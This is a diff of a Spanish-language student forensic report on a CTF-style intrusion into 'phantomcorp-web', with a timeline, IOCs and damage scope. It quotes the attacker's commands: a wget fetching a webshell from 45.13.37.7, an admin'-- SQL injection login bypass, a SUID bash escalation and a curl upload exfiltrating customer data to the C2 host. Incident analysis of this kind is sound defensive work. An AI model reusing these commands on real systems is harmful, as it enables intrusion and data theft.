@@ -1,16 +1,8 @@
 # Informe forense — Incidente PhantomCorp (phantomcorp-web)
 
-**Grupo:** 06
-**Fecha:** 2026-10-23
-**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración
+**Grupo:** 06 · **Investigadores:** Martín Beccereca — martinbeccereca; Belén Benito — belubenito603; Alejo José De Miguel — AlejoDM; Tomás Giudici — TomasGiudici; Carolina Suppo — carosuppo · **Fecha:** 30/10/2026
 
-| Nombre y apellido | Usuario de GitHub |
-|---|---|
-| Martín Beccereca | martinbeccereca |
-| Belén Benito | belubenito603 |
-| Alejo José De Miguel | AlejoDM |
-| Tomás Giudici | TomasGiudici |
-| Carolina Suppo | carosuppo |
+**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración
 
 ## 0. Declaración de uso de IA
 
@@ -22,17 +14,11 @@
 
 **Herramienta:** Codex (OpenAI).
 
-- **Finalidad del uso:** apoyo para examinar en modo solo lectura el artefacto defanged del webshell de R2 y el historial extraído de memoria para P4, y para redactar el aporte documental.
-- **Partes asistidas:** correlación log–disco de R2, IOC del webshell, eventos de timeline vinculados, respuesta P4, bitácora y salidas de evidencia.
-- **Verificación:** los valores, rutas, horas y líneas incorporados se contrastaron con las salidas crudas guardadas. No se ejecutó, reconstruyó ni modificó el contenido del webshell; el equipo debe revisar este texto y conservar la declaración solo si representa el uso real de IA.
+- **Finalidad del uso:** apoyo para analizar, en modo solo lectura, el artefacto defanged del webshell de R2, el historial extraído de memoria de R3–R4 y los artefactos de procesos, archivos abiertos y disco; también para redactar los aportes documentales correspondientes.
+- **Partes asistidas:** correlación log–disco de R2; análisis de R3; IOC del webshell y del binario SUID; eventos de timeline vinculados; respuestas P4 y P5; bitácora y salidas de evidencia.
+- **Verificación:** los valores, rutas, horas y líneas incorporados se contrastaron con las salidas crudas, los artefactos, los hashes del checkout y los objetos locales de Git. No se ejecutó, reconstruyó ni modificó el contenido del webshell o del binario; se guardaron las salidas de evidencia, incluido el rechazo inicial del verificador.
 
-
-**Herramienta:** Codex (OpenAI), aporte de la persona P3.
-
-- **Finalidad y partes asistidas:** análisis de R3, correlación de historial/procesos/archivos abiertos/disco, IOC del binario SUID, eventos de timeline, respuesta P5, revisión del aporte P1 y bitácora.
-- **Verificación:** referencias contrastadas con los artefactos, hashes del checkout y objetos locales de Git; se guardaron salidas y el rechazo del verificador.
-
-**Herramienta:** ChatGPT (OpenAI), aporte de la Persona 5.
+**Herramienta:** ChatGPT (OpenAI)
 
 - **Finalidad del uso:** asistencia para verificar la integridad de los archivos del caso mediante SHA-256, identificar la evidencia alterada y documentar los resultados del Reto 5.
 - **Partes asistidas:** análisis de la cadena de custodia, respuesta P2, registro de comandos y revisión de la tabla de indicadores de compromiso (IOCs).
@@ -46,7 +32,7 @@
 
 ## 1. Resumen del incidente
 
-Las solicitudes registradas son consistentes con que el atacante `185.220.101.42` aprovechó el endpoint de reportes e instaló un webshell; la evidencia de disco también registra persistencia mediante `/etc/cron.d/phantom-maint` (`logs/access.log:18-21`; `disco/listado.txt:4,6`).
+Las solicitudes registradas son consistentes con que el atacante `185.220.101.42` aprovechó el endpoint de reportes e instaló un webshell (`logs/access.log:18-21`; `disco/listado.txt:4`). La evidencia de disco registra además la ruta de persistencia `/etc/cron.d/phantom-maint` (`disco/listado.txt:6`); el paquete no incluye el contenido de esa tarea.
 El historial y la captura de procesos muestran el uso de un programa con privilegios de root y una conexión a `45.13.37.7:4444` (`memoria/bash_history.txt:5-9`; `memoria/pslist.txt:7-9`; `memoria/netstat.txt:4`).
 Una petición al webshell solicitó `clientes.db.txt` y el log registra una respuesta HTTP 200 de 48.210 bytes; el historial registra que se preparó un archivo comprimido y se intentó enviarlo a `45.13.37.7` (`logs/access.log:22`; `disco/listado.txt:7`; `memoria/bash_history.txt:8-9`).
 No se puede confirmar que el servidor externo recibiera el archivo ni el alcance total de la exposición; la IP observada no identifica por sí sola a una persona. Además, `logs/auth.log` no coincide con el hash de custodia (`evidencia/salidas/r5-custodia.txt:28-32`).
@@ -63,7 +49,7 @@ Sin embargo, el archivo `logs/auth.log` continuó presentando una discrepancia q
 
 **Hash esperado:** `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`
 
-**Hash obtenido:** `9c052de3124d0364ae0172b81621c94d47bf78a2e816ba8c69be4d84468f1a6f`
+**Hash local obtenido:** `9c052de3124d0364ae0172b81621c94d47bf78a2e816ba8c69be4d84468f1a6f`
 
 Al revisar el contenido del archivo, encontramos anotaciones que indican que se eliminaron líneas y que el archivo fue editado después de su captura (`logs/auth.log:5-7`). En la línea 8 aparece el marcador `FLAG{dfir_custodia_alterada}`, que fue aceptado por el validador oficial.
 
@@ -77,19 +63,23 @@ Antes de analizar `logs/access.log` se corrió `shasum -a 256 -c evidencia.sha25
 
 Como control, se calculó el hash de `logs/access.log` contra el contenido tal como está comiteado en git (`git show HEAD:... | sha256sum`), que no pasa por esa conversión. Ese hash coincide con el registrado en `evidencia.sha256`: el archivo usado para R1 está íntegro. La verificación de los 9 archivos y la identificación del que sí está alterado quedan para la sección de R5.
 
-
 Control complementario de P3: [hashes de los bytes locales](evidencia/salidas/p3-custodia-previa.txt). Todos difieren del manifiesto; no se considera íntegro el checkout byte a byte. Para las cinco fuentes utilizadas por P3, los objetos locales de `HEAD` sí coinciden con el manifiesto y el checkout solo difiere en CRLF/LF ([comparación](evidencia/salidas/p3-custodia-fuentes.txt)). Esa transformación se comparó en memoria, sin escribir en el caso. Esto delimita el efecto de Windows sobre estas fuentes; no autentica el origen del manifiesto ni sustituye el análisis de R5, que queda a su responsable.
+
 ## 3. Línea de tiempo del ataque
 
-| Hora (UTC) | Evento | Evidencia (archivo:línea) |
-|---|---|---|
-| 05/Sep/2026 02:18:10 | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: primera prueba de ejecución de comandos contra el endpoint. Confirmado por la respuesta `200`. | `logs/access.log:18` |
-| 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
-| 05/Sep/2026 02:19:02 | La misma IP usa el canal RCE para ejecutar `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. El listado de disco ubica ese archivo a las 02:19 y la evidencia defanged lo identifica como webshell; la coincidencia de ruta y minuto confirma la correlación log–disco. | `logs/access.log:20`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` |
-| 05/Sep/2026 02:19:48 | La misma IP solicita `/uploads/shell.php?c=whoami` y recibe `200`. Esto es consistente con el uso posterior del webshell descargado; el log no muestra el cuerpo de respuesta ni permite atribuir una identidad real al atacante. | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:5-10` |
-| 05/Sep/2026 02:21 (hora del listado; zona no declarada en esa fuente) | El listado registra creación/modificación de `/usr/local/bin/system-check`, descrito como copia de Bash SUID root. El historial muestra búsqueda de SUID y ejecución del mismo binario con `-p -c 'id'`, sin hora propia. Es consistente con la escalada; 02:21 no prueba la hora exacta de ejecución. | `disco/listado.txt:1-5`; `memoria/bash_history.txt:5-7` |
-| 05/Sep/2026 02:30 UTC (captura, no inicio del proceso) | El PID 1477 `system-check`, usuario `root`, `euid=0`, tiene como padre al PID 1240 `bash` de `www-data`. `lsof` vincula el PID 1477 con `/usr/local/bin/system-check`. Las fuentes respaldan un proceso con privilegios elevados en la captura. | `memoria/pslist.txt:1,7-8`; `memoria/lsof.txt:4` |
-| 05/Sep/2026 02:30 UTC (captura, no hora de ejecución/envío) | La captura de memoria muestra `nc` PID 1490 conectado a `45.13.37.7:4444` y como hijo de `system-check` PID 1477. Es evidencia de una conexión C2 en ese instante; no prueba que esa conexión llevara el archivo enviado por `curl`. | `memoria/pslist.txt:1,7-9`; `memoria/netstat.txt:4`; `memoria/lsof.txt:3` |
+| Hora (UTC)                                                            | Evento                                                                                                                                                                                                                                                                                                                                | Evidencia (archivo:línea)                                                                        |
+| --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| 05/Sep/2026 02:14:03–02:14:22                                         | La IP `185.220.101.42` realiza reconocimiento: consulta `/`, `robots.txt` y enumera rutas como `/admin`, `/login`, `/backup`, `/portal-rrhh` y `/uploads`. Los User-Agent `zgrab` y `gobuster` son compatibles con escaneo, pero no identifican por sí solos una herramienta ni a una persona.                                        | `logs/access.log:6-12`                                                                           |
+| 05/Sep/2026 02:17:22                                                  | Tras dos intentos fallidos, la misma IP envía `user=admin'--` a `/portal-rrhh/login` y recibe `200`; a las 02:17:41 accede a `/backup/rrhh.conf`. La secuencia es consistente con un bypass SQLi y la obtención del token usado luego en `/api/reporte`; el log no conserva los cuerpos de respuesta.                                 | `logs/access.log:14-18`                                                                          |
+| 05/Sep/2026 02:18:10                                                  | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: solicitud que prueba el parámetro `cmd`. El `200` acredita la respuesta HTTP, no por sí solo la ejecución ni su salida.                                                                                                                                                      | `logs/access.log:18`                                                                             |
+| 05/Sep/2026 02:18:33                                                  | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Junto con la descarga posterior y el historial recuperado, es consistente con ejecución remota mediante el parámetro; el nombre de la flag no clasifica por sí solo el vector como SQLi. | `logs/access.log:19`; `memoria/bash_history.txt:4`                                               |
+| 05/Sep/2026 02:19:02                                                  | La misma IP usa el canal RCE para ejecutar `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. El listado de disco ubica ese archivo a las 02:19 y la evidencia defanged lo identifica como webshell; la coincidencia de ruta y minuto confirma la correlación log–disco.                                                   | `logs/access.log:20`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` |
+| 05/Sep/2026 02:19:48                                                  | La misma IP solicita `/uploads/shell.php?c=whoami` y recibe `200`. Esto es consistente con el uso posterior del webshell descargado; el log no muestra el cuerpo de respuesta ni permite atribuir una identidad real al atacante.                                                                                                     | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:5-10`                       |
+| 05/Sep/2026 02:22 (hora del listado; zona no declarada en esa fuente) | El listado registra `/etc/cron.d/phantom-maint` como persistencia. El artefacto defanged del webshell indica que se relanzaría por cron cada cinco minutos; el paquete no contiene la tarea ni demuestra su ejecución.                                                                                                                | `disco/listado.txt:6`; `disco/var/www/uploads/shell.php.evidencia.txt:9`                         |
+| 05/Sep/2026 02:21 (hora del listado; zona no declarada en esa fuente) | El listado registra creación/modificación de `/usr/local/bin/system-check`, descrito como copia de Bash SUID root. El historial muestra búsqueda de SUID y ejecución del mismo binario con `-p -c 'id'`, sin hora propia. Es consistente con la escalada; 02:21 no prueba la hora exacta de ejecución.                                | `disco/listado.txt:1-5`; `memoria/bash_history.txt:5-7`                                          |
+| 05/Sep/2026 02:30 UTC (captura, no inicio del proceso)                | El PID 1477 `system-check`, usuario `root`, `euid=0`, tiene como padre al PID 1240 `bash` de `www-data`. `lsof` vincula el PID 1477 con `/usr/local/bin/system-check`. Las fuentes respaldan un proceso con privilegios elevados en la captura.                                                                                       | `memoria/pslist.txt:1,7-8`; `memoria/lsof.txt:4`                                                 |
+| 05/Sep/2026 02:30 UTC (captura, no hora de ejecución/envío)           | La captura de memoria muestra `nc` PID 1490 conectado a `45.13.37.7:4444` y como hijo de `system-check` PID 1477. Es evidencia de una conexión C2 en ese instante; no prueba que esa conexión llevara el archivo enviado por `curl`.                                                                                                  | `memoria/pslist.txt:1,7-9`; `memoria/netstat.txt:4`; `memoria/lsof.txt:3`                        |
+
 **R2 — webshell:** la evidencia de disco contiene `FLAG{dfir_webshell_hallado}`; el extracto completo y la correlación con el log están en [r2-webshell-disco.txt](evidencia/salidas/r2-webshell-disco.txt). La flag fue registrada con el verificador oficial tras normalizar a LF la copia temporal de los scripts y manifiestos utilizados por el verificador ([envío aceptado](evidencia/salidas/r2-submit.txt)).
 
 **R3 — escalada SUID:** [fuentes con líneas](evidencia/salidas/r3-escalada-memoria.txt) y [salida directa de `rg`](evidencia/salidas/r3-fuentes-rg.txt). El historial contiene `/usr/local/bin/system-check -p -c 'id'` en la línea 6 y el marcador `FLAG{dfir_privesc_suid}` en la 7. Siendo una copia SUID root de Bash según el listado, `-p` conserva el privilegio efectivo al arrancar y `-c` ejecuta la orden indicada. El historial no incluye la salida de `id`; el respaldo de privilegios procede de `pslist`, que declara `euid=0`. No se ejecutó el binario ni se asumió que la escalada fuera persistencia por sí misma.
@@ -100,19 +90,19 @@ El primer [intento de registrar R3](evidencia/salidas/r3-submit.txt) fue rechaza
 
 ## 4. Indicadores de compromiso (IOCs)
 
-| Tipo | Valor | Dónde apareció |
-|---|---|---|
-| IP atacante | `185.220.101.42` | `logs/access.log:18-20`: origen de las solicitudes al endpoint `/api/reporte?cmd=`. No se verificó la identidad real del atacante. |
-| IP/puerto C2 | `45.13.37.7:4444` | `memoria/netstat.txt:4`: conexión TCP `ESTABLISHED` asociada al proceso `nc` (PID 1490). |
-| Archivo malicioso | `/var/www/uploads/shell.php` | `disco/listado.txt:4`, `disco/var/www/uploads/shell.php.evidencia.txt:1-9` y `logs/access.log:20-21`: webshell y actividad relacionada. |
-| Usuario backdoor | `phantom-svc` (UID 0, GID 0) | `disco/etc/passwd.snippet:4`: cuenta identificada como backdoor con privilegios de root. |
-| Persistencia | Cuenta `phantom-svc` y binario SUID `/usr/local/bin/system-check` | `disco/etc/passwd.snippet:4`, `disco/listado.txt:5` y `memoria/bash_history.txt:6`. Posibles mecanismos de acceso privilegiado. |
-| Binario SUID sospechoso | `/usr/local/bin/system-check` | `disco/listado.txt:5`, `memoria/bash_history.txt:5-6` y `memoria/lsof.txt:4`. No se dispone del binario para calcular su hash. |
-| Proceso elevado (contexto de captura) | PID 1477, PPID 1240, `system-check`, `root`, `euid=0` | `memoria/pslist.txt:7-8`: proceso elevado cuyo padre es una shell de `www-data`. |
+| Tipo                                  | Valor                                                 | Dónde apareció                                                                                                                                                                                              |
+| ------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| IP atacante                           | `185.220.101.42`                                      | `logs/access.log:18-20`: origen de las solicitudes al endpoint `/api/reporte?cmd=`. No se verificó la identidad real del atacante.                                                                          |
+| IP/puerto C2                          | `45.13.37.7:4444`                                     | `memoria/netstat.txt:4`: conexión TCP `ESTABLISHED` asociada al proceso `nc` (PID 1490).                                                                                                                    |
+| Archivo malicioso                     | `/var/www/uploads/shell.php`                          | `disco/listado.txt:4`, `disco/var/www/uploads/shell.php.evidencia.txt:1-9` y `logs/access.log:20-21`: webshell y actividad relacionada.                                                                     |
+| Usuario backdoor                      | `phantom-svc` (UID 0, GID 0)                          | `disco/etc/passwd.snippet:4`: cuenta identificada como backdoor con privilegios de root.                                                                                                                    |
+| Persistencia                          | `/etc/cron.d/phantom-maint`                           | `disco/listado.txt:6` y `disco/var/www/uploads/shell.php.evidencia.txt:9`: se la describe como relanzamiento del webshell cada cinco minutos. El contenido y la ejecución de la tarea no están disponibles. |
+| Binario SUID sospechoso               | `/usr/local/bin/system-check`                         | `disco/listado.txt:5`, `memoria/bash_history.txt:5-6` y `memoria/lsof.txt:4`. No se dispone del binario para calcular su hash.                                                                              |
+| Proceso elevado (contexto de captura) | PID 1477, PPID 1240, `system-check`, `root`, `euid=0` | `memoria/pslist.txt:7-8`: proceso elevado cuyo padre es una shell de `www-data`.                                                                                                                            |
 
 ## 5. Alcance del daño
 
-### Confirmado por los artefactos
+### Observado en los artefactos
 
 - `access.log` registra una solicitud al webshell que pide ejecutar `cat /app/priv/clientes.db.txt` y una respuesta HTTP `200` de 48.210 bytes (`logs/access.log:22`). Esto es consistente con que esos datos se sirvieran al solicitante; no se conserva el cuerpo para identificar su contenido. El listado de disco registra un archivo comprimido de 48.210 bytes en `/tmp/.exfil/clientes.tar.gz` a las 02:23 (`disco/listado.txt:7`).
 - El historial recuperado de memoria registra que se creó `/tmp/.exfil/clientes.tar.gz` a partir de `/app/priv/clientes.db.txt` y luego se invocó `curl` con un envío multipart de ese archivo a `http://45.13.37.7/upload`, con el marcador `FLAG{dfir_c2_exfil}` en el parámetro `tag` (`memoria/bash_history.txt:8-9`). Esto confirma que los comandos para preparar y enviar el archivo figuran en el historial; el paquete no aporta una respuesta HTTP ni una captura del contenido recibido por el destino.
@@ -141,7 +131,7 @@ El log registra una respuesta de 48.210 bytes al solicitante de la petición del
 
 El orden de volatilidad dice que se captura primero lo que se pierde más rápido. La RAM solo existe mientras la máquina está encendida: procesos en ejecución, conexiones de red activas y, en este caso, el historial de comandos de la sesión del atacante, viven ahí. El disco persiste aunque se apague el equipo, así que puede esperar. Si se captura primero el disco, cualquier cosa que solo estuviera en memoria en ese momento se pierde para siempre apenas el proceso termina o la máquina se reinicia.
 
-En este caso puntual no tengo, desde R1, un ejemplo donde la memoria conservara algo que el disco ya no tenía (eso corresponde al R4, sobre `bash_history` en memoria, fuera de mi análisis). Lo que sí puedo señalar desde R1 es la razón estructural: `access.log` registra que el atacante ejecutó comandos arbitrarios a través del parámetro `cmd` (líneas 18-20), lo cual implica que corrió procesos y, probablemente, abrió conexiones de red (la descarga del webshell con `wget`) que en el momento de la intrusión solo existían como estado de memoria — procesos y sockets activos — y no como artefactos de disco. Si el equipo de respuesta hubiera esperado a capturar disco antes que memoria, esa actividad en curso se habría perdido apenas terminaran esos procesos.
+El ejemplo concreto del caso es `memoria/bash_history.txt`: el propio artefacto indica que el `.bash_history` de disco fue borrado por el atacante, pero la copia recuperada de memoria conserva las órdenes previas y el posterior `history -c` (`memoria/bash_history.txt:1-10`). También la captura de las 02:30 UTC conserva procesos y sockets activos, como `nc` conectado a `45.13.37.7:4444`, que podrían desaparecer al terminar el proceso o apagar el host (`memoria/pslist.txt:7-9`; `memoria/netstat.txt:4`). Por eso una adquisición de disco posterior no sustituye la captura temprana de RAM.
 
 **P2 — ¿Qué implica que una evidencia digital haya sido alterada? ¿Cómo afecta a su valor probatorio?**
 
@@ -186,6 +176,7 @@ Ese conocimiento no reemplaza la evidencia: el historial no aporta salida de `id
    ```
 
    El script calcula hashes, consulta únicamente objetos locales de Git mediante `git show HEAD:<ruta>` y produce un extracto con números de línea. No implementa la ampliación opcional `timeline.py`. El historial se lee como texto, nunca como órdenes a ejecutar.
+
 3. Se preparó una copia temporal del verificador oficial y sus bibliotecas con finales LF; el manifest se usó como entrada opaca del motor. Desde esa raíz temporal, con Git Bash local, se ejecutó:
 
    ```bash
@@ -194,7 +185,7 @@ Ese conocimiento no reemplaza la evidencia: el historial no aporta salida de `id
    ```
 
    Se conservaron las evidencias del primer intento rechazado y del estado parcial. Posteriormente, se ejecutó desde Git Bash, en la raíz del repositorio, `./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'`. El verificador oficial aceptó la flag y confirmó que R3 estaba resuelto. Se registró el progreso mediante `./ctf status 11`, cuya salida se guardó en `evidencia/salidas/r3-status-confirmado.txt`. No se alteraron los artefactos forenses ni el mecanismo de verificación.
-   
+
 4. Revisión del aporte de P1: las líneas 18-20 de `access.log` registran solicitudes y HTTP 200; ese código solo no confirma ejecución del parámetro ni el contenido de la respuesta. El marcador decodificado y la coincidencia de `wget` en `memoria/bash_history.txt:4` son corroboración adicional, pero el historial no fija una hora propia. Conviene reemplazar «confirmado por 200» por «solicitud observada, consistente con RCE al correlacionar fuentes». La respuesta P1 menciona procesos y sockets volátiles, pero deja pendiente el ejemplo solicitado de memoria frente a disco; `memoria/bash_history.txt:1,10` ofrece ese ejemplo. Esta revisión deja observaciones para P1 sin reescribir su respuesta ni asumir su tarea.
 
 ### Persona P4 — R4, alcance, respuesta y P3 (2026-10-28)
